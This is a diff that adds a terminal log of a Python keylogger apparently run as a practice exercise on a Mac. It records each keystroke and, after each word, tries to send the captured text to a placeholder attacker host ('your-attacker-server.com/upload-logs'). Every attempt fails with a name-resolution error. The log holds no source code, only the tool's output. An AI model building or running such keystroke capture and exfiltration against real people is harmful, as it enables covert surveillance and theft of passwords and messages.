@@ -1,0 +1,69 @@
+(venv) mac@MacBook-Pro-3 keylogger % python3 main.py
+This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.
+Start key logging...
+Key Pressed:  Key.shift
+Key Pressed:  'T'
+TKey Pressed:  'h'
+hKey Pressed:  'i'
+iKey Pressed:  's'
+sKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 5 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x106a1c2f0>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  'i'
+iKey Pressed:  's'
+sKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 4 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x106a01e50>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  'a'
+aKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 3 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x106a025d0>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  Key.shift
+Key Pressed:  'T'
+TKey Pressed:  'e'
+eKey Pressed:  's'
+sKey Pressed:  't'
+tKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 6 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x10699b950>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  Key.shift
+Key Pressed:  'P'
+PKey Pressed:  'r'
+rKey Pressed:  'a'
+aKey Pressed:  'c'
+cKey Pressed:  't'
+tKey Pressed:  'i'
+iKey Pressed:  'c'
+cKey Pressed:  'e'
+eKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 10 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x106a38180>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  't'
+tKey Pressed:  'a'
+aKey Pressed:  's'
+sKey Pressed:  'k'
+kKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 6 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x1069be570>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  'c'
+cKey Pressed:  'o'
+oKey Pressed:  'm'
+mKey Pressed:  'p'
+pKey Pressed:  'l'
+lKey Pressed:  'e'
+eKey Pressed:  't'
+tKey Pressed:  'e'
+eKey Pressed:  Key.space
+ 
+[Exfiltrating Data - Size: 10 bytes}
+[ERROR] Could not connect to server: HTTPConnectionPool(host='your-attacker-server.com', port=80): Max retries exceeded with url: /upload-logs (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x106a3ce20>: Failed to resolve 'your-attacker-server.com' ([Errno 8] nodename nor servname provided, or not known)"))
+Key Pressed:  Key.shift
+Key Pressed:  '!'
+!End key logging...
+(venv) mac@MacBook-Pro-3 keylogger % This is a Test Practice task complete !
